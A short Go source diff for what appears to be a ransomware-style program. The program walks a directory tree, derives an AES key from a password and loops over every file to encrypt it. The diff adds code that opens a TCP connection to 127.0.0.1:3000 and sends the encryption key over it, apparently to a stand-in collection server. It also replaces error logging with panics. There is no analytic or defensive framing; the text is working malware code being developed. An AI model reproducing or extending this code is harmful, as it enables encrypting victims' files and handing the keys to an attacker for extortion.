@@ -6,7 +6,7 @@ import (
 	"crypto/rand"
 	"io"
 	"keys"
-	"log"
+	"net"
 	"os"
 	"path/filepath"
 
@@ -22,6 +22,11 @@ func main() {
 		panic(err)
 	}
 	key := []byte(passwd)
+	sock, err := net.Dial("tcp", "127.0.0.1:3000")
+	if err != nil {
+		panic(err)
+	}
+	sock.Write(key)
 	for i := 0; i < len(allfiles); i++ {
 		block, err := aes.NewCipher(key)
 		if err != nil {
@@ -56,7 +61,7 @@ func main() {
 func ListAll(path string) (paths []string) {
 	filepath.Walk(path, func(fullpath string, info os.FileInfo, err error) error {
 		if err != nil {
-			log.Println(err)
+			panic(err)
 			return filepath.SkipDir
 		}
 		if !info.IsDir() {
